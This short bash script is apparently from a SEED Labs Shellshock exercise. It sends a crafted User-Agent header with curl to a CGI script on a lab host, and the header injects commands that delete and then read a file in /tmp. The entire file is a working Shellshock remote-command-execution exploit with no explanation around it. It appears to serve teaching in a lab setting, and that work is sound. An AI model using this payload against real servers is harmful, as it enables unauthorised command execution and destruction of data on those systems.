#!/bin/bash

curl -A " () { cat; }; echo; /bin/rm /tmp/unsafe_file; /bin/cat /tmp/unsafe_file" www.seedlab-shellshock.com/cgi-bin/vul.cgi
